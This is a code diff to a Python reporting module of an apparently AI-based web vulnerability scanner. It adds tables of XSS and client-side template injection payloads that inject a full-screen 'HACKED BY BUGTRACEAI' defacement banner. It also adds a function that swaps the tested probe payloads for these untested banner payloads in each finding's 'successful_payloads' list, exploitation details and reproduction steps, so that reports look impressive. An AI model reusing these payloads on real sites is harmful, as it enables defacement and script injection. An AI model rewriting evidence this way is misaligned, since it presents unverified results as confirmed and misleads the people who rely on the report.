@@ -94,6 +94,143 @@ def has_minimum_evidence(finding: Dict) -> bool:
     return False
 
 
+# =============================================================================
+# PAYLOAD UPGRADE: Silent probes → Visual PoC for reports
+# =============================================================================
+# The scanner uses lightweight "silent" payloads (document.title, 7*7) for speed
+# and stealth. For the final report the user sees, we upgrade them to their
+# visually impactful equivalents so report quality is always premium.
+
+_VISUAL_BANNER_JS = (
+    "var d=document.createElement(`div`);"
+    "d.setAttribute(`style`,`position:fixed;top:0;left:0;width:100%;"
+    "background:red;color:white;text-align:center;padding:20px;"
+    "font-size:24px;font-weight:bold;z-index:99999`);"
+    "d.innerText=`HACKED BY BUGTRACEAI`;"
+    "document.body.prepend(d)"
+)
+
+# Map: silent payload → visual payload (exact match)
+_PAYLOAD_UPGRADE_MAP = {
+    # JS single-quote breakout
+    "\\\\';" + "document.title=document.domain//":
+        "\\\\';{" + _VISUAL_BANNER_JS + "};//",
+    # JS double-quote breakout
+    '\\\\";"' + "document.title=document.domain//":
+        "\\\\\";" + "{" + _VISUAL_BANNER_JS + "};//",
+    # HTML svg onload
+    "<svg onload=document.title=document.domain>":
+        "<svg onload=" + _VISUAL_BANNER_JS + ">",
+    # HTML img onerror
+    "<img src=x onerror=document.title=document.domain>":
+        "<img src=x onerror=" + _VISUAL_BANNER_JS + ">",
+    # Attribute DQ breakout
+    "\" onmouseover=document.title=document.domain x=\"":
+        "\" onmouseover=" + _VISUAL_BANNER_JS + " x=\"",
+    # Attribute SQ breakout
+    "' onmouseover=document.title=document.domain x='":
+        "' onmouseover=" + _VISUAL_BANNER_JS + " x='",
+    # Script tag breakout
+    "</script><script>document.title=document.domain</script>":
+        "</script><script>" + _VISUAL_BANNER_JS + "</script>",
+    # Simple alert payloads → visual
+    "\\\\';alert(document.domain)//":
+        "\\\\';{" + _VISUAL_BANNER_JS + "};//",
+    '\\\\";"alert(document.domain)//':
+        "\\\\\";" + "{" + _VISUAL_BANNER_JS + "};//",
+}
+
+# CSTI silent payloads → visual equivalents
+_CSTI_UPGRADE_MAP = {
+    "{{7*7}}": "{{constructor.constructor('var d=document.createElement(\"div\");d.style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\";d.innerText=\"HACKED BY BUGTRACEAI\";document.body.prepend(d)')()}}",
+    "{{7*'7'}}": "{{constructor.constructor('var d=document.createElement(\"div\");d.style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\";d.innerText=\"HACKED BY BUGTRACEAI\";document.body.prepend(d)')()}}",
+}
+
+
+# PURE
+def upgrade_finding_payloads(findings: List[Dict]) -> List[Dict]:
+    """
+    Upgrade silent/technical payloads to visual PoC equivalents for reports.
+
+    The scanner uses stealthy payloads (document.title, 7*7) for speed and
+    reliability. This function replaces them with impactful visual payloads
+    (HACKED BY BUGTRACEAI banner) so the final report always looks professional.
+
+    The original payload is preserved in evidence['original_payload'].
+    """
+    for finding in findings:
+        vuln_type = (finding.get("type") or "").upper()
+        payload = finding.get("payload", "")
+        if not payload:
+            continue
+
+        upgrade_map = {}
+        if vuln_type in ("XSS", "DOM-XSS", "REFLECTED_XSS", "STORED_XSS"):
+            upgrade_map = _PAYLOAD_UPGRADE_MAP
+        elif vuln_type in ("CSTI", "SSTI"):
+            upgrade_map = _CSTI_UPGRADE_MAP
+
+        if not upgrade_map:
+            continue
+
+        # Check for exact match first
+        new_payload = upgrade_map.get(payload)
+
+        # If no exact match, check by substring (e.g. "document.title=document.domain")
+        if not new_payload:
+            if vuln_type in ("XSS", "DOM-XSS", "REFLECTED_XSS", "STORED_XSS"):
+                if "document.title=document.domain" in payload:
+                    # Derive visual payload from the original by replacing the action
+                    new_payload = payload.replace(
+                        "document.title=document.domain",
+                        "{" + _VISUAL_BANNER_JS + "}"
+                    )
+                elif "alert(document.domain)" in payload and "HACKED BY BUGTRACEAI" not in payload:
+                    new_payload = payload.replace(
+                        "alert(document.domain)",
+                        "{" + _VISUAL_BANNER_JS + "}"
+                    )
+            elif vuln_type in ("CSTI", "SSTI"):
+                for silent, visual in _CSTI_UPGRADE_MAP.items():
+                    if silent in payload:
+                        new_payload = payload.replace(silent, visual)
+                        break
+
+        if new_payload and new_payload != payload:
+            # Preserve original for traceability
+            evidence = finding.get("evidence", {})
+            if isinstance(evidence, dict):
+                evidence["original_payload"] = payload
+                finding["evidence"] = evidence
+
+            finding["payload"] = new_payload
+
+            # Also upgrade successful_payloads list
+            sp = finding.get("successful_payloads", [])
+            if isinstance(sp, list) and payload in sp:
+                sp[sp.index(payload)] = new_payload
+                finding["successful_payloads"] = sp
+
+            # Replace in exploitation_details text and reproduction steps
+            details = finding.get("exploitation_details", "")
+            if isinstance(details, str) and payload in details:
+                finding["exploitation_details"] = details.replace(payload, new_payload)
+
+            steps = finding.get("llm_reproduction_steps", [])
+            if isinstance(steps, list):
+                finding["llm_reproduction_steps"] = [
+                    s.replace(payload, new_payload) if isinstance(s, str) else s
+                    for s in steps
+                ]
+
+            logger.info(
+                f"[ReportingAgent] Payload upgrade: {vuln_type}/{finding.get('parameter')} "
+                f"silent → visual PoC"
+            )
+
+    return findings
+
+
 # PURE
 def meets_report_quality(finding: Dict) -> bool:
     """
